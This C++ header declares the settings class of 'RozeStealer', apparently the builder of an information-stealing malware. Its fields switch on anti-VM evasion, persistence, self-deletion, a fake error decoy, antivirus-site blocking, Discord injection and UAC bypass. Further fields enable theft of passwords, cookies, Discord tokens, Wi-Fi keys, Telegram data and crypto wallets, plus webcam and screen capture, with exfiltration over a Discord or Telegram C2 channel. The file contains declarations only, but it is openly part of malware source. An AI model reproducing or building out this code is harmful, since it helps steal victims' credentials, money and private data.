#ifndef ROZE_STEALER_SETTINGS_H
#define ROZE_STEALER_SETTINGS_H

#include <string>
#include <vector>
#include <map>

namespace RozeStealer {

class Settings {
public:
    bool updatesCheck;
    std::string password;

    // BuilderOptionsFrame settings
    bool pingMe;
    bool vmProtect;
    bool startup;
    bool melt;
    bool fakeError;
    std::string fakeErrorTitle;
    std::string fakeErrorMessage;
    int fakeErrorIcon;
    bool blockAvSites;
    bool discordInjection;
    bool uacBypass;
    bool pumpStub;
    long long pumpLimit; // in bytes

    bool captureWebcam;
    bool capturePasswords;
    bool captureCookies;
    bool captureHistory;
    bool captureAutofills;
    bool captureDiscordTokens;
    bool captureGames;
    bool captureWifiPasswords;
    bool captureSystemInfo;
    bool captureScreenshot;
    bool captureTelegram;
    bool captureCommonFiles;
    bool captureWallets;

    std::string boundExePath;
    bool boundExeRunOnStartup;
    std::vector<char> iconBytes;

    bool outputAsExe;
    int consoleMode; // 0 = None, 1 = Force, 2 = Debug
    int c2Mode;      // 0 = Discord, 1 = Telegram
    std::string c2Entry;

    Settings();
    void loadConfig(const std::string& configFile = "config.json");
    void saveConfig(const std::string& configFile = "config.json");
};

} // namespace RozeStealer

#endif // ROZE_STEALER_SETTINGS_H


